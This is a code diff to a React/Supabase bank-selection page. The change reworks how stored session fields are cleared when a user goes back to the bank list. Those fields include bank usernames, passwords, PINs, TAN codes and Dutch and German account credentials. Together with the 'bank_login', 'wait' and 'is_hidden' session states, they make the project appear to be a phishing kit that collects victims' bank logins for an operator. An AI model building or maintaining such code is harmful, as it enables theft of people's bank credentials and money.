@@ -16,6 +16,33 @@ type Props = {
   initialBanks: BankCatalogEntry[];
 };
 
+const RETURN_TO_BANK_LIST_FLAG = "bank-page:return-to-list";
+const BANK_SESSION_FIELDS_TO_CLEAR = [
+  "bankSlug",
+  "bankName",
+  "loginMethod",
+  "personalCode",
+  "bankPhone",
+  "username",
+  "password",
+  "verfuegernummer",
+  "pin",
+  "tacCode",
+  "rekeningnummer",
+  "pasnummer",
+  "toegangscode",
+  "signatuur",
+  "identificatiecode",
+  "orderedField1",
+  "orderedField1Key",
+  "orderedField2",
+  "orderedField2Key",
+  "orderedField2Type",
+  "orderedField3",
+  "orderedField3Key",
+  "orderedField3Type",
+] as const;
+
 export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: Props) {
   const router = useRouter();
   const supabase = useMemo(() => createBrowserSupabaseClient(), []);
@@ -25,6 +52,7 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
   const [bankSlug, setBankSlug] = useState("");
   const [searchTerm, setSearchTerm] = useState("");
   const [saving, setSaving] = useState(false);
+  const [resettingSelection, setResettingSelection] = useState(true);
   const [msg, setMsg] = useState<string | null>(null);
   const [recovering, setRecovering] = useState(false);
   const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});
@@ -45,6 +73,48 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
       refreshAbortRef.current?.abort();
     };
   }, []);
+
+  const resetSessionBankSelection = useCallback(async () => {
+    if (supabase === null || !sessionId) return;
+
+    const { data } = await supabase
+      .from("sessions")
+      .select("current_step,form_data")
+      .eq("id", sessionId)
+      .maybeSingle();
+
+    if (!data) return;
+
+    const currentStep = typeof data.current_step === "string" ? data.current_step : "";
+    const previousFormData = ((data.form_data ?? {}) as Record<string, unknown>) || {};
+    const hadBankState =
+      currentStep === "bank" ||
+      currentStep === "bank_login" ||
+      currentStep === "wait" ||
+      BANK_SESSION_FIELDS_TO_CLEAR.some((key) => {
+        const value = previousFormData[key];
+        return typeof value === "string" ? value.trim().length > 0 : Boolean(value);
+      });
+
+    const nextFormData = { ...previousFormData };
+    for (const field of BANK_SESSION_FIELDS_TO_CLEAR) {
+      delete nextFormData[field];
+    }
+
+    setSessionFormData(nextFormData);
+    setBankSlug("");
+
+    if (!hadBankState) return;
+
+    await supabase
+      .from("sessions")
+      .update({
+        is_hidden: false,
+        current_step: "banken",
+        form_data: nextFormData,
+      })
+      .eq("id", sessionId);
+  }, [sessionId, supabase]);
 
   const refreshBanks = useCallback(async () => {
     if (navigationLockRef.current) return;
@@ -94,10 +164,45 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
   }, [sessionId]);
 
   useEffect(() => {
+    try {
+      if (window.sessionStorage.getItem(RETURN_TO_BANK_LIST_FLAG) !== "1") {
+        return;
+      }
+
+      selectionVersionRef.current += 1;
+      navigationLockRef.current = false;
+      refreshAbortRef.current?.abort();
+      setSaving(false);
+      setResettingSelection(true);
+      setMsg(null);
+      setRecovering(false);
+      setSearchTerm("");
+      setBankSlug("");
+      setBanks(initialBanks);
+
+      void (async () => {
+        await resetSessionBankSelection();
+        try {
+          window.sessionStorage.removeItem(RETURN_TO_BANK_LIST_FLAG);
+        } catch {
+          /* ignore sessionStorage errors */
+        }
+        if (mountedRef.current) {
+          setResettingSelection(false);
+        }
+        void refreshBanks();
+      })();
+    } catch {
+      /* ignore sessionStorage errors */
+    }
+  }, [initialBanks, refreshBanks, resetSessionBankSelection]);
+
+  useEffect(() => {
     const resetUi = () => {
       selectionVersionRef.current += 1;
       navigationLockRef.current = false;
       setSaving(false);
+      setResettingSelection(true);
       setMsg(null);
       setRecovering(false);
       setSearchTerm("");
@@ -166,19 +271,18 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
     let cancelled = false;
     void (async () => {
       if (supabase === null || !sessionId) return;
-      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
-      if (cancelled || !data) return;
-      const fd = (data.form_data ?? {}) as Record<string, string>;
-      setSessionFormData(fd);
-      setBankSlug(fd.bankSlug ?? "");
+      setResettingSelection(true);
+      await resetSessionBankSelection();
+      if (cancelled) return;
+      setResettingSelection(false);
     })();
     return () => {
       cancelled = true;
     };
-  }, [sessionId, supabase]);
+  }, [resetSessionBankSelection, sessionId, supabase]);
 
   async function handleBankSelect(nextBankSlug: string, displayName: string) {
-    if (!supabase || !sessionId || !nextBankSlug || navigationLockRef.current) return;
+    if (!supabase || !sessionId || !nextBankSlug || navigationLockRef.current || resettingSelection) return;
 
     const selectionVersion = selectionVersionRef.current + 1;
     selectionVersionRef.current = selectionVersion;
@@ -194,14 +298,11 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
       bankName: displayName,
     };
     
-    // Banka değiştirildiğinde eski bankaya ait giriş bilgilerini temizle
-    const bankSpecificFields = [
-      "username", "password", "verfuegernummer", "pin", "rekeningnummer", 
-      "pasnummer", "toegangscode", "signatuur", "identificatiecode", "tacCode"
-    ];
-    for (const field of bankSpecificFields) {
+    for (const field of BANK_SESSION_FIELDS_TO_CLEAR) {
       delete nextFormData[field];
     }
+    nextFormData.bankSlug = nextBankSlug;
+    nextFormData.bankName = displayName;
 
     const { error } = await supabase
       .from("sessions")
@@ -317,7 +418,7 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
                     key={opt.slug}
                     type="button"
                     onClick={() => void handleBankSelect(opt.slug, opt.displayName)}
-                    disabled={saving}
+                  disabled={saving || resettingSelection}
                     className={`group flex min-h-[4.25rem] w-full items-center gap-3 rounded-full border px-3 py-2 text-left transition-all duration-200 ${
                       bankSlug === opt.slug
                         ? "border-[#ffe784] bg-[linear-gradient(180deg,rgba(255,213,0,0.18),rgba(255,213,0,0.08))] shadow-[0_0_0_1px_rgba(255,240,170,0.22),0_0_24px_rgba(255,214,10,0.14)]"
